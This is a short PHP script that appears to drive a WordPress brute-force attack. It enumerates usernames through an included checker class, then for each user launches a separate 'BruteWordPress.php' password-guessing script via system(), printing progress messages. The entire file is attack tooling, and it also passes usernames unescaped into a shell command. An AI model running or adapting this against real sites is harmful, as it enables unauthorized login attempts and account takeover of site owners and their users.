<?php
include 'chkuser.php';

$chk = new Chkuser();
$chk->run();
$user_arr = $chk->result();

//print_r($user_arr);

function broter($user) {
    
    system('php BruteWordPress.php ' . target . ' ' . $user);
}
printf("[+] %s Broting...\r\n", date('h:i:s', time()));
foreach ($user_arr as $user) {
    echo '[*] Brute user ' . iconv("UTF-8","GB18030//IGNORE",$user). " ..." . str_repeat(' ', 60) . "\r";
    broter($user);
}
show_time();
?>